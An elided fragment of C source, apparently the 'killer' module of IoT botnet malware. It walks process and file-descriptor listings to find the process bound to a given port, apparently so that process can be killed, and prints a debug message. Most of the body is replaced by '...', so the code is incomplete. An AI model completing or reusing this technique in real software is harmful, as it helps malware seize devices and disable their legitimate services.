...
BOOL killer_kill_by_port(port_t port)
{
    ...
    while (util_fdgets(buffer, 512, fd) != NULL)
    {
        ...
        if (util_stristr(&(buffer[ii]), util_strlen(&(buffer[ii])), port_str, util_strlen(port_str)) != -1)
        {
            int column_index = 0;
        ...
        while ((entry = readdir(dir)) != NULL && ret == 0)
        {
            ...
            if ((fd_dir = opendir(path)) != NULL)
            {
                while ((fd_entry = readdir(fd_dir)) != NULL && ret == 0)
                {
                    ...
                    if (mem_exists(exe, util_strlen(exe), inode, util_strlen(inode)) != FALSE)
                    {
#ifdef DEBUG
                        printf("[killer] Found pid %d for port %d\n", util_atoi(pid), ntohs(port));
